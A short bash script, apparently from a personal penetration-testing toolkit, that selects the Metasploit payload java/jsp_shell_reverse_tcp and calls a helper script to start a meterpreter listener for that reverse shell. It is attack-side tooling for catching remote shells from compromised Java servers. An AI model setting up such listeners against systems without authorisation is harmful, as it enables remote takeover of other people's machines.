#!/bin/bash

: '
meterpreter: start meterpreter listener java/jsp_shell_reverse_tcp
'

PAYLOAD="java/jsp_shell_reverse_tcp"
bash ~/Desktop/base/code/xdotool/scripts/shell/msfconsole/.files/listen_to_meterpreter_rev_shell.sh "${PAYLOAD}"
